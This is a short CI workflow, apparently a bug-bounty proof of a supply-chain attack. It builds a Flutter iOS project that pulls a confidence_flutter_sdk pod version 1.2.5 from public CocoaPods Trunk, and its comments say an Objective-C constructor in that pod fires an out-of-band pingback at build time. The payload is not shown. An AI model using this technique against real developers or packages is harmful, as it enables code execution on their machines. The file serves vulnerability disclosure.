name: Supply Chain RCE Proof
on: [push, workflow_dispatch]

jobs:
  simulate-developer-machine:
    runs-on: macos-latest
    
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Simulate Official Integration Guide
        run: |
          # 1. Create a dummy project (Wadah untuk trigger kerentanan)
          flutter create rce_test
          
          # 2. Masuk ke folder project
          cd rce_test
          
          # 3. Patch Podfile agar Deployment Target (iOS 14.0) sesuai dengan podspec lu
          # Ini buat nge-bypass error "higher minimum deployment target" tadi
          sed -i '' "s/platform :ios, '13.0'/platform :ios, '14.0'/" ios/Podfile
          
          # 4. Tambahkan package (Simulasi instruksi resmi dari README Spotify)
          flutter pub add confidence_flutter_sdk
          
          # 5. Trigger resolusi CocoaPods untuk sisi native iOS
          cd ios
          pod repo update
          
          # Log verbose untuk membuktikan sistem menarik versi 1.2.5 dari public Trunk
          pod install --verbose
          
          # 6. Jalankan Build untuk memicu Objective-C Constructor (__attribute__((constructor)))
          # Di tahap inilah OAST pingback lu bakal ter-trigger secara otomatis
          cd ..
          flutter build ios --no-codesign
